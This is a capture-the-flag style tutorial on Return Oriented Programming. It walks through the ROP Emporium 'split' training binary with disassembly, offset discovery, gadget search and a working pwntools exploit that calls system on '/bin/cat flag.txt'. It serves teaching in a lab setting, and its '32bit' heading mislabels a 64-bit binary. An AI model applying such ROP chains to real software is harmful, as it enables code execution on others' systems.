# ROP or Return Oriented Programming


ROP is a technique used to bypass the non-exeutable stack while using the available gadgets from the associated binaries i.e. opcodes ending with `ret`. See "tools". 

# ROP 32bit

Let's take the binary `split` from ROP-Emporium and pwn it:-

```r
robin@oracle:~/ROP-Emporium$ gdb-gef -q split
Reading symbols from split...(no debugging symbols found)...done.
GEF for linux ready, type `gef' to start, `gef config' to configure
79 commands loaded for GDB 8.1.0.20180409-git using Python engine 3.6
[*] 1 command could not be loaded, run `gef missing` to know why.
gef➤  checksec
[+] checksec for '/home/robin/ROP-Emporium/split'
Canary                        : No
NX                            : Yes
PIE                           : No
Fortify                       : No
RelRO                         : Partial
gef➤  
```

It has `NX` enabled so we will use Return Oriented Programming technique to get a shell. Let's reverse engineer it first:-

Using `radare2` first:-

```r
robin@oracle:~/ROP-Emporium$ r2 -AAAA split
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze len bytes of instructions for references (aar)
[x] Analyze function calls (aac)
[x] Emulate code to find computed references (aae)
[x] Analyze consecutive function (aat)
[x] Constructing a function name for fcn.* and sym.func.* functions (aan)
[x] Type matching analysis for all functions (afta)
[0x00400650]> afl
0x00400000    2 64           fcn.rip
0x00400041    1 7            fcn.00400041
0x00400048    1 164          fcn.00400048
0x004005a0    3 26           sym._init
0x004005d0    1 6            sym.imp.puts
0x004005e0    1 6            sym.imp.system
0x004005f0    1 6            sym.imp.printf
0x00400600    1 6            sym.imp.memset
0x00400610    1 6            sym.imp.__libc_start_main
0x00400620    1 6            sym.imp.fgets
0x00400630    1 6            sym.imp.setvbuf
0x00400640    1 6            sub.__gmon_start___248_640
0x00400650    1 41           entry0
0x00400680    4 50   -> 41   sym.deregister_tm_clones
0x004006c0    3 53           sym.register_tm_clones
0x00400700    3 28           sym.__do_global_dtors_aux
0x00400720    4 38   -> 35   entry1.init
0x00400746    1 111          sym.main
0x004007b5    1 82           sym.pwnme
0x00400807    1 17           sym.usefulFunction
0x00400820    4 101          sym.__libc_csu_init
0x00400890    1 2            sym.__libc_csu_fini
0x00400894    1 9            sym._fini
[0x00400650]> pdf @sym.pwnme
/ (fcn) sym.pwnme 82
|   sym.pwnme ();
|           ; var int local_20h @ rbp-0x20
|              ; CALL XREF from 0x0040079f (sym.main)
|           0x004007b5      55             push rbp
|           0x004007b6      4889e5         mov rbp, rsp
|           0x004007b9      4883ec20       sub rsp, 0x20
|           0x004007bd      488d45e0       lea rax, qword [local_20h]
|           0x004007c1      ba20000000     mov edx, 0x20               ; 32 ; size_t n
|           0x004007c6      be00000000     mov esi, 0                  ; int c
|           0x004007cb      4889c7         mov rdi, rax                ; void *s
|           0x004007ce      e82dfeffff     call sym.imp.memset         ; void *memset(void *s, int c, size_t n)
|           0x004007d3      bfd0084000     mov edi, str.Contriving_a_reason_to_ask_user_for_data... ; 0x4008d0 ; "Contriving a reason to ask user for data..." ; const char * s
|           0x004007d8      e8f3fdffff     call sym.imp.puts           ; int puts(const char *s)
|           0x004007dd      bffc084000     mov edi, 0x4008fc           ; const char * format
|           0x004007e2      b800000000     mov eax, 0
|           0x004007e7      e804feffff     call sym.imp.printf         ; int printf(const char *format)
|           0x004007ec      488b159d0820.  mov rdx, qword [obj.stdin]  ; [0x601090:8]=0 ; FILE *stream
|           0x004007f3      488d45e0       lea rax, qword [local_20h]
|           0x004007f7      be60000000     mov esi, 0x60               ; '`' ; 96 ; int size
|           0x004007fc      4889c7         mov rdi, rax                ; char *s
|           0x004007ff      e81cfeffff     call sym.imp.fgets          ; char *fgets(char *s, int size, FILE *stream)
|           0x00400804      90             nop
|           0x00400805      c9             leave
\           0x00400806      c3             ret
[0x00400650]> pdf @sym.usefulFunction
/ (fcn) sym.usefulFunction 17
|   sym.usefulFunction ();
|           0x00400807      55             push rbp
|           0x00400808      4889e5         mov rbp, rsp
|           0x0040080b      bfff084000     mov edi, str.bin_ls         ; 0x4008ff ; "/bin/ls" ; const char * string
|           0x00400810      e8cbfdffff     call sym.imp.system         ; int system(const char *string)
|           0x00400815      90             nop
|           0x00400816      5d             pop rbp
\           0x00400817      c3             ret
[0x00400650]> izzq~sh
0x11 10 9 .shstrtab
0x44 10 9 .gnu.hash
[0x00400650]> izzq~cat
0x601060 18 17 /bin/cat flag.txt
[0x00400650]> 
```

>izzq~<str> is used to find the address of a specific string in that ELF.

As this is X86-64 bit binary, according to calling convention of x86-64 the arguments provided into the function as parameter is stored in register. The first argument is stored in `rdi`, I'd recommend reading on calling convention.

So, let's find the buffer offset, shall we?

```r
robin@oracle:~/ROP-Emporium$ gdb-gef -q split
Reading symbols from split...(no debugging symbols found)...done.
GEF for linux ready, type `gef' to start, `gef config' to configure
79 commands loaded for GDB 8.1.0.20180409-git using Python engine 3.6
[*] 1 command could not be loaded, run `gef missing` to know why.
gef➤  pattern create 100
[+] Generating a pattern of 100 bytes
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa
[+] Saved as '$_gef0'
gef➤  r
Starting program: /home/robin/ROP-Emporium/split 
split by ROP Emporium
64bits

Contriving a reason to ask user for data...
> aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa

Program received signal SIGSEGV, Segmentation fault.


-- snip --


──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "split", stopped, reason: SIGSEGV
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x400806 → pwnme()
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
0x0000000000400806 in pwnme ()
gef➤  pattern search faaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaala
[+] Searching 'faaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaala'
[+] Found at offset 40 (big-endian search) 
gef➤  
```
Ah, easier than manual find.

So, let's find a gadget as we already know that `/bin/cat flag.txt` and the symbol `system` is present let's find the `pop rdi; ret;` so the string would be provided to system for execution.
Ropper to the rescue:-

```s
robin@oracle:~/ROP-Emporium$ ropper --file split --search 'pop rdi'
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop rdi

[INFO] File: split
0x0000000000400883: pop rdi; ret; 
```

Now, our payload would be `padding + pop_rdi + bin_cat + system`, breaking it down:-

First `padding` offset to the stack pointer, now the gadget `pop rdi; ret;` as the `/bin/cat flag.txt` will be stored in rdi register we will just provide the `system` address and we are done.

Let's craft the exploit:-

```python
from pwn import *

p = process("./split")

payload = "A"*40  # padding 
payload += p64(0x400883) # pop_rdi
payload += p64(0x601060) # /bin/cat flag.txt
payload += p64(0x400810) # system

p.recvuntil(">") # This will recieve wait we reach this
p.sendline(payload) # Sending the payload afterwards as input
p.interactive()
```

```s
robin@oracle:~/ROP-Emporium$ echo "We got it" > flag.txt
robin@oracle:~/ROP-Emporium$ python split_exploit.py 
[+] Starting local process './split': pid 12495
[*] Switching to interactive mode
 We got it
[*] Got EOF while reading in interactive
$ 
[*] Process './split' stopped with exit code -11 (SIGSEGV) (pid 12495)
[*] Got EOF while sending in interactive
robin@oracle:~/ROP-Emporium$ 
```

Poof, we got it.

